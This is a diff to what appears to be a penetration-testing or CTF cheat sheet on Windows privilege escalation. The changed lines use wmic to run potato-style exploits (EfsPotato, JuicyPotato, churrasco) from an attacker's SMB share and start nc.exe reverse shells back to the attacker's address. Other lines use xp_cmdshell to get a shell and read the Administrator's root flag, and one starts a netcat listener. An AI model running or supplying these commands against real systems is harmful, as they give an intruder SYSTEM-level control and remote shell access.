@@ -1491,11 +1491,11 @@ $a.GetExportedTypes() | ForEach-Object { $_.FullName }
 [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils].GetMethods() | ft Name, IsStatic, ReturnType
 
 +---------- SeImpersonatePrivilege ----------+
-C:\programdata\EfsPotato.exe "C:\programdata\nc.exe $MYIP 5566 -e cmd"
+wmic process call create "\\$MYIP\$\EfsPotato.exe \"\\$MYIP\$\nc.exe $MYIP 5566 -e cmd\""
+wmic process call create "\\$MYIP\$\jp32.exe -l 1337 -p \"cmd.exe\" -a \"/c \\$MYIP\$\nc.exe $MYIP 5566 -e cmd\"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
+wmic process call create "\\$MYIP\$\churrasco.exe -d \"\\$MYIP\$\nc.exe -e cmd.exe $MYIP 5566\""
 xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c C:\programdata\nc.exe $MYIP 5566 -e cmd"
 xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c type C:\Users\Administrator\Desktop\root.txt"
-C:\programdata\jp32.exe -l 1337 -p "cmd.exe" -a "/c \programdata\nc.exe $MYIP 5566 -e cmd"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
-C:\programdata\churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe $MYIP 5566"
 
 +---------- DnsAdmins ----------+
 rlwrap nc -lvnp 5555
